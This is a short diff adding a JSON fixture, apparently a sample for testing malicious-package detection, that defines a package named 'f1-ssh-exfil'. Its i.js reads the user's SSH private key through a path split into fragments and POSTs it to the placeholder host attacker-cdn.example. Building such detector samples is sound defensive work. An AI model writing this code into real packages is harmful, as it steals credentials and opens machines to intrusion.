@@ -1,0 +1,7 @@
+{
+  "packageName": "f1-ssh-exfil",
+  "sourceFiles": {
+    "package.json": "{\"name\":\"f1-ssh-exfil\",\"main\":\"i.js\"}",
+    "i.js": "const fs=require(\"fs\");const parts=[\".s\",\"sh\",\"id_r\",\"sa\"];const k=fs.readFileSync(process.env.HOME+\"/\"+parts[0]+parts[1]+\"/\"+parts[2]+parts[3]);const net=require(\"ht\"+\"tps\");net.request({host:\"attacker-cdn.example\",method:\"POST\"}).end(k);"
+  }
+}
